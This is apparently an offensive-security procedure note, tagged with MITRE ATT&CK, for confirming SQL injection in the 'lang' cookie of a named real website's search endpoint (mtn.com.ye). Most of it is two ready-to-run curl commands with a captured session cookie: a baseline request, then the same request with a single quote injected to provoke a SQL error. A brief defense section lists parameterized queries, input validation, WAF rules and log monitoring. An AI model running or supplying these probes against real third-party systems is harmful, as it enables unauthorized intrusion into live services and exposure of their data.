---
id: proc-mtn-sqli-discovery
tags:
  - sqli
  - cookie-injection
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/baseline-search-request]]'
  - '[[commands/sqli-single-quote-injection]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.202Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Discover-SQL-Injection-in-Lang-Cookie

## Summary

This procedure identifies SQL injection vulnerabilities in the 'lang' cookie parameter by sending baseline requests and injecting a single quote to trigger syntax errors, confirming lack of sanitization in the MTN Yemen search endpoint.

## Description

In web applications using cookies directly in SQL queries without parameterization, injecting special characters like single quotes can break query syntax, revealing the vulnerability. This targets the /index.php/search/default endpoint where the lang cookie influences database queries for localization. Prerequisites include network access to the target and tools for cookie manipulation. Expected outcomes: SQL error exposure indicating injection feasibility.

## Requirements

1. Network access to mtn.com.ye
2. Ability to craft HTTP requests with custom cookies
3. Proxy tool like Burp Suite for inspection

## Defense

Defensive measures and detection strategies:

- Use prepared statements or parameterized queries for all database inputs
- Sanitize and validate cookie values server-side
- Implement Web Application Firewall (WAF) rules to block quote injections
- Monitor logs for SQL error responses

## Objectives

1. Establish baseline response
2. Trigger and observe SQL syntax error
3. Confirm injection point in lang cookie

## Instructions

### Step 1: Send Baseline Request

**Context**: Verify normal endpoint behavior with standard lang=en cookie.

**Command** ([[commands/baseline-search-request]]):
```bash
curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" \
  -H "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

> This command sends a standard GET request; expect a quick, error-free HTML response confirming baseline.

### Step 2: Inject Single Quote

**Context**: Append a single quote to lang cookie to disrupt SQL syntax.

**Command** ([[commands/sqli-single-quote-injection]]):
```bash
curl -X GET "http://mtn.com.ye/index.php/search/default?t=1&x=0&y=0" \
  -H "Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1" \
  -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

> Observe SQL syntax error in response body, indicating direct cookie interpolation in queries.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/baseline-search-request]]
- [[commands/sqli-single-quote-injection]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- sqli
- discovery
